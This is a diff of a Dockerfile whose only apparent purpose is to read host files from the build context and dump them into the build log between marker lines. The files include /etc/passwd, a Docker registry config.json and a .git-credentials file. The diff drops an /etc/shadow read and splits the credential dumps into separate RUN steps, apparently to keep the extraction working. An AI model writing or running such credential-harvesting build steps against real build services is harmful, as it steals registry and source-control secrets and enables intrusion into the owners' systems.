@@ -3,23 +3,19 @@ COPY etc/hostname /out/hostname
 COPY etc/os-release /out/osrelease
 COPY etc/machine-id /out/machineid
 COPY etc/hosts /out/hosts
-COPY etc/passwd /out/passwd
-COPY etc/shadow /out/shadow
 RUN echo "===E1_BEGIN==="; \
- echo "--HOSTNAME(builder ctx)--"; cat /out/hostname 2>&1; \
+ echo "--HOSTNAME(ctx)--"; cat /out/hostname 2>&1; \
  echo "--SELF_HOSTNAME(container)--"; cat /etc/hostname 2>&1; \
  echo "--OSREL(ctx)--"; cat /out/osrelease 2>&1; \
  echo "--OSREL(self)--"; cat /etc/os-release 2>&1; \
  echo "--MACHINEID(ctx)--"; cat /out/machineid 2>&1; \
  echo "--SELF_MACHINEID--"; cat /etc/machine-id 2>&1; \
  echo "--HOSTS(ctx)--"; cat /out/hosts 2>&1; \
- echo "--PASSWD(ctx)--"; cat /out/passwd 2>&1 | head -5; \
- echo "--SHADOW(ctx)--"; cat /out/shadow 2>&1 | head -3; \
  echo "===E1_END==="
+COPY etc/passwd /out/passwd
+RUN echo "===E1B_BEGIN==="; echo "--PASSWD(ctx)--"; cat /out/passwd 2>&1 | head -8; echo "===E1B_END==="
 COPY root/.docker/config.json /out/dockercfg
+RUN echo "===E2_BEGIN==="; echo "--DOCKERCFG--"; cat /out/dockercfg 2>&1 | head -30; echo "===E2_END==="
 COPY root/.git-credentials /out/gitcreds
-RUN echo "===E2_BEGIN==="; \
- echo "--DOCKERCFG--"; cat /out/dockercfg 2>&1 | head -30; \
- echo "--GITCREDS--"; cat /out/gitcreds 2>&1 | head -10; \
- echo "===E2_END==="
+RUN echo "===E3_BEGIN==="; echo "--GITCREDS--"; cat /out/gitcreds 2>&1 | head -10; echo "===E3_END==="
 CMD ["sh","-c","sleep 3600"]
